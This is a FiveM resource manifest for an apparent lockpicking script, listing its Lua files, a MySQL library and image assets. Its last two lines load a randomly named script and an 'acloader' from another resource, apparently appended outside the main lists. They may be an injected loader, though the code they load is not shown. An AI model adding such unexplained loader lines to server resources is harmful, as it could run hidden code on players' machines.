resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

client_scripts {
	'config.lua',
  'utils.lua',
	'client.lua',
}

server_scripts {	
  '@mysql-async/lib/MySQL.lua',
	'config.lua',
  'utils.lua',
	'server.lua',
}

files {
  'LockPick1.png',
  'LockPick2.png',
  'LockPick3.png',
}
client_script "api-ac_rLlOtyMkSYUF.lua"
client_script "@watermeloen/acloader.lua"